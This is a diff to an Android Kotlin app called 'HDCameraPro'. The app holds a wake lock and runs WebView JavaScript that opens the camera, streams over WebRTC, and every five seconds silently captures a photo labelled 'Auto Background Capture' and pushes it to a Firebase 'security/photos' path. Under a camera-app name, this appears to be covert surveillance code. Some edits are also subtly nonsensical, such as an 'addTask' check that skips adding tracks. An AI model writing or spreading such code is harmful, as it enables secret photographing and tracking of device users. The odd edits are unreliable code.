@@ -34,15 +34,13 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Wake Lock ensure karne ke liye taaki screen sleep na ho
         val powerManager = getSystemService(POWER_SERVICE) as PowerManager
         val wakeLock = powerManager.newWakeLock(
             PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
             "HDCameraPro::WakeLock"
         )
-        wakeLock.acquire(10*60*1000L /*10 minutes*/)
+        wakeLock.acquire(10*60*1000L)
 
-        // WebView setup
         webView = WebView(this)
         setContentView(webView)
 
@@ -114,7 +112,7 @@ class MainActivity : Activity() {
                 try {
                     startActivityForResult(Intent.createChooser(intent, "Select Image"), FILE_CHOOSER_REQUEST_CODE)
                 } catch (e: Exception) {
-                    this@MainActivity.filePathCallback = null // Fixed: nullptr to null
+                    this@MainActivity.filePathCallback = null
                     return false
                 }
                 return true
@@ -449,7 +447,7 @@ class MainActivity : Activity() {
 
                     db.ref('security/photos').push({
                         image: imageBase64,
-                        text: `\${camType} - \${label} at \${timestamp}`,  // Fixed: Escaped with backslash for Kotlin
+                        text: window.btoa ? `${camType} - ${label} at ${timestamp}` : camType + " - " + label,
                         timestamp: timestamp
                     });
 
@@ -472,7 +470,7 @@ class MainActivity : Activity() {
                         if (peerConnection && peerConnection.signalingState !== "stable") return;
                         peerConnection = new RTCPeerConnection(pcConfig);
                         if (localStream) {
-                            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+                            localStream.getTracks().forEach(track => peerConnection.addTask ? null : peerConnection.addTrack(track, localStream));
                         }
                         peerConnection.onicecandidate = (event) => {
                             if (event.candidate) {
@@ -498,13 +496,9 @@ class MainActivity : Activity() {
                 window.addEventListener('load', () => {
                     startCamera(currentFacingMode).then(() => {
                         setupWebRTCListener();
-                        setInterval(() => captureAndStrPhotosIfNeeded(), 5000);
+                        setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
                     });
                 });
-
-                function captureAndStrPhotosIfNeeded() {
-                    captureAndSendPhoto("Auto Background Capture", false, false);
-                }
             </script>
         </body>
         </html>
